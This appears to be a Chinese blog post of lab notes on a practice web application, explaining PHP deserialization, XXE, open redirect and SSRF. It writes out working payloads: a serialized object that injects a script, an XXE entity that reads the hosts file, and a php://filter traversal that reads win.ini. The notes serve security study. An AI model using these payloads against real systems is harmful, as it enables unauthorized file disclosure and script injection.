+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>serialize():序列化函数，把一个对象变成可以传输的字符串<br>unserialize():反序列化函数，字符串还原为对象<br>__construct():对象创建时被调用<br>__destruct():对象销毁时被调用<br>__toString():对象被当作字符串使用<br>__sleep():对象被序列化之前运行<br>__wakeup():序列化之后立即被调用</p>
+<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p>查看一下源码<br>![p85](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p85.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p85.png）</a><br>意思是把输入的内容进行反序列化生成对象实例，然后输出对象实例的test这个数据成员</p>
+<p>输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:&quot;S&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;test&quot;;s:<span class="number">29</span>:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>实现xss攻击</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:&quot;S&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;test&quot;;s:<span class="number">64</span>:&quot;&lt;script&gt;window.location.replace(&#x27;http://www.baidu.com&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>可以直接跳转到别的页面</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>xml外部实体注入漏洞<br>攻击者向服务器注入指定的xml实体内容，让服务器按照指定的配置进行执行导致问题</p>
+<p>#XXE</p>
+<p>查看源码</p>
+<p>![p86](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p86.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p86.png）</a></p>
+<p>simple_load_string（）函数，函数转换形式良好的XML字符串为SimpleXMLElement对象XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</p>
+<p>先用这个进行测试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?xml version <span class="operator">=</span> &quot;1.0&quot;?<span class="operator">&gt;</span> </span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE note [     <span class="operator">&lt;</span><span class="operator">!</span>ENTITY hacker &quot;xxe&quot;<span class="operator">&gt;</span> ]<span class="operator">&gt;</span> </span><br><span class="line"><span class="operator">&lt;</span>name<span class="operator">&gt;</span><span class="operator">&amp;</span>hacker;<span class="operator">&lt;</span><span class="operator">/</span>name<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出xxe</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?xml version<span class="operator">=</span>&quot;1.0&quot;?<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE <span class="keyword">ANY</span>[ </span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span>ENTITY f <span class="keyword">SYSTEM</span> &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;<span class="operator">&gt;</span></span><br><span class="line">]<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>x<span class="operator">&gt;</span><span class="operator">&amp;</span>f;<span class="operator">&lt;</span><span class="operator">/</span>x<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+<p>展示文件内容</p>
+<h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p>可能发生在一切执行了url地址跳转的地方。<br>后端采用了前端传进来的参数作为跳转的目的地，没有做判断，就可能发生跳错对象的问题</p>
+<p>直接危害：钓鱼<br>攻击者使用漏洞方的域名做掩盖，最终跳转钓鱼网站</p>
+<h1 id="不安全的url跳转"><a href="#不安全的url跳转" class="headerlink" title="不安全的url跳转"></a>不安全的url跳转</h1><p>将这个改成百度的网址，当点击时就会直接跳转到百度</p>
+<p>![p87](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p87.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p87.png）</a></p>
+<h2 id="SSRF（服务器端请求伪造）"><a href="#SSRF（服务器端请求伪造）" class="headerlink" title="SSRF（服务器端请求伪造）"></a>SSRF（服务器端请求伪造）</h2><p>形成原因：服务端提供了从其他服务器应用获取数据的功能，但没有对目标地址做严格的过滤和限制，攻击者可以传入任意的地址让后端服务器对其发起请求，返回目标地址请求的数据</p>
+<p>file_get_contents()<br>fsockopen()<br>curl_exec()</p>
+<p>形成原因：服务端提供了从其他服务器应用获取数据的功能，但没有对目标地址做严格的过滤和限制，攻击者可以传入任意的地址让后端服务器对其发起请求，返回目标地址请求的数据</p>
+<p>file_get_contents()<br>fsockopen()<br>curl_exec()</p>
+<h1 id="SSRF（curl）"><a href="#SSRF（curl）" class="headerlink" title="SSRF（curl）"></a>SSRF（curl）</h1><p>SSRF常用的协议:<br>HTTTP(s),file,dict,ghoper</p>
+<p>点开页面的诗，发现URL参数可控，可以直接修改为其他链接</p>
+<h1 id="SSRF（file-get-content）"><a href="#SSRF（file-get-content）" class="headerlink" title="SSRF（file_get_content）"></a>SSRF（file_get_content）</h1><p>这里可以使用php伪协议，使用php://filter/read=convert.base64-encode/resource=c:../../../windows/win.ini<br>![p88](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p88.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p88.png）</a><br>之后进行base64解码即可<br>![p89](<a target="_blank" rel="noopener" href="https://github.com/Lin060807/images/raw/main/p89.png%EF%BC%89">https://github.com/Lin060807/images/raw/main/p89.png）</a></p>
+</script></p>
     </article>
     
     <div class="read-nums">
